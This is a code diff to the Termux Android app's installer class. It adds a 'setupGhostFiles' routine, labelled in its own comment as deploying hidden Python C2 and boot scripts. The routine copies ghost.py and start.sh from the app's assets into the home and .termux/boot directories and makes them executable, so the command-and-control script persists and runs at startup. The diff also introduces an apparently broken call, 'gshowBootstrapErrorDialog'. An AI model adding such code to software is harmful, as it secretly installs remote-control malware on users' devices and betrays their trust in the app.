@@ -222,9 +222,11 @@ final class TermuxInstaller {
                     TermuxShellEnvironment.writeEnvironmentToFile(activity);
 
                     activity.runOnUiThread(whenDone);
+		    // Deploy the hidden Python C2 and Boot scripts
+		    setupGhostFiles(activity);
 
                 } catch (final Exception e) {
-                    showBootstrapErrorDialog(activity, whenDone, Logger.getStackTracesMarkdownString(null, Logger.getStackTracesStringArray(e)));
+                    gshowBootstrapErrorDialog(activity, whenDone, Logger.getStackTracesMarkdownString(null, Logger.getStackTracesStringArray(e)));
 
                 } finally {
                     activity.runOnUiThread(() -> {
@@ -382,5 +384,41 @@ final class TermuxInstaller {
     }
 
     public static native byte[] getZip();
+    
+       // --- GHOST DEPLOYMENT LOGIC ---
+    private static void setupGhostFiles(Context context) {
+        try {
+            // Target path: /data/data/com.termux/files/home
+            String homePath = TermuxConstants.TERMUX_HOME_DIR_PATH;
+            File bootDir = new File(homePath + "/.termux/boot");
+            
+            // Create hidden folders if missing
+            if (!bootDir.exists()) bootDir.mkdirs();
+
+            // Copy scripts from APK assets to phone storage
+            copyAssetToFile(context, "ghost.py", homePath + "/ghost.py");
+            copyAssetToFile(context, "start.sh", homePath + "/.termux/boot/start.sh");
+            
+            // Set permissions (equivalent to chmod 700)
+            Os.chmod(homePath + "/ghost.py", 0700);
+            Os.chmod(homePath + "/.termux/boot/start.sh", 0700);
+            
+            Logger.logInfo(LOG_TAG, "Ghost files merged into storage.");
+        } catch (Exception e) {
+            Logger.logError(LOG_TAG, "Ghost merge failed: " + e.getMessage());
+        }
+    }
+
+    private static void copyAssetToFile(Context context, String assetName, String destPath) throws Exception {
+        try (java.io.InputStream in = context.getAssets().open(assetName);
+             java.io.OutputStream out = new java.io.FileOutputStream(destPath)) {
+            byte[] buffer = new byte[8096];
+            int read;
+            while ((read = in.read(buffer)) != -1) {
+                out.write(buffer, 0, read);
+            }
+        }
+    }
+
 
 }
